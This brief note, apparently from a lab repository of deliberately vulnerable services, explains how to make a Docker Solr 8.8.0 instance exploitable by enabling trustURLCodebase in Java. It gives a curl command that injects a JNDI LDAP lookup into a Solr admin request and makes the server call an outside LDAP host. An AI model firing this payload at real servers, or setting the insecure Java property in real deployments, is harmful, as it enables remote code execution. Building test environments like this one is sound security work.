# Vulnerable Services

## solr 8.8.0

The docker image for solr 8.8.0 uses a version of Java new enough that it requires a system property be misconfigured to work...  It needs `com.sun.jndi.ldap.object.trustURLCodebase=true`.

To exploit:

```
curl 'http://SOLR_SERVER_IP:8983/solr/admin/cores?foo=$\{jndi:ldap://TARGET_IP:8080/PATH\}'
```
